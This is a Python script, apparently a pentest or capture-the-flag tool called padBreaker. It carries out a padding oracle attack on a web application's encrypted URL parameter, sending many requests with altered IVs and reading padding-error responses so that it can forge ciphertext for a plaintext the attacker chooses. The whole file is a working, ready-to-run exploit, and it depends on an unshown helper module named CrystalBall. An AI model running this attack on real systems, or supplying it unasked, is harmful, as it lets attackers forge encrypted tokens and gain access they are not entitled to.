#!/usr/bin/perl -e$_=$ARGV[0];exec(s{\w+$}{../exploit-env/bin/python3}r,@ARGV)

import sys

import CrystalBall

###############################

def main():
	introduction = 'Welcome to padBreaker: This exploit performs the padding oracle attack to encrypt urls - have fun\n'
	print('\n' + introduction)

	target = CrystalBall.URLHandler(*sys.argv[1:-1])
	engine = CrystalBall.AsyncRequest(20)
	engine.request([target.get_url()])

	print('Attempting to retrieve url:')
	print('Status code: {}, Response Length: {}\n'.format(*engine.results[0]))

	print('Starting attack')
	print('Formatting plaintext')

	plain_text = sys.argv[4].replace('\\n', '\n') #Alter this if you need some substitutions
	payload = target.to_bytearray(plain_text)

	print('Checking return codes for padding errors ...\n')

	sequential_block = target.to_bytearray()[1] 
	encryption = sequential_block

	for i, block in enumerate(reversed(payload)):
		print('BLOCK ' + str(len(payload) - i))

		count = 0
		found = bytearray() 
		iv_update = bytearray() 

		while(count != target.size):
			# Make requests
			iv_array = target.generate_iv_list(iv_update)
			url_array = [[i, sequential_block] for i in iv_array]
			url_array = list(map(lambda x: target.get_url(x), url_array))
			engine.request(url_array)

			# find IV
			print('Responses for byte {}: {}'.format(target.size-count, engine.responses))
			found.insert(0, iv_array[engine.prophecy()][-(count+1)]^(count + 1))

			# Update IV or add encrypted block
			if (count != target.size-1):
				iv_update = bytearray([found[i]^(count+2) for i in range(count+1)])
			else:
				sequential_block = bytearray([n^m for n, m in zip(found, block)])
				encryption = sequential_block + encryption
			count += 1

		print(iv_update)
		print(found)
		print(block)
		print(sequential_block)
		print(encryption)
		print('\n')

	print('\n' + target.get_url(encryption) + '\n')

if __name__ == '__main__':
	main()